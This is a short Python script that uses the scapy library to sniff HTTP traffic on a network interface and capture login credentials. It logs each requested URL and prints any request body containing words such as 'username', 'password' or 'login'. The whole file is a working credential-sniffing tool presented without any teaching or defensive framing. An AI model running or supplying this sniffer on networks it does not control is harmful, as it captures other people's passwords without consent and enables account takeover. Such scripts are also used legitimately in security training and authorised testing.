#/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

keywords =["username", "password", "login", "email", "pass", "log", "UName", "UPass"]

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            for keyword in keywords:
                if keyword in load:
                    print(load)

sniff("eth0")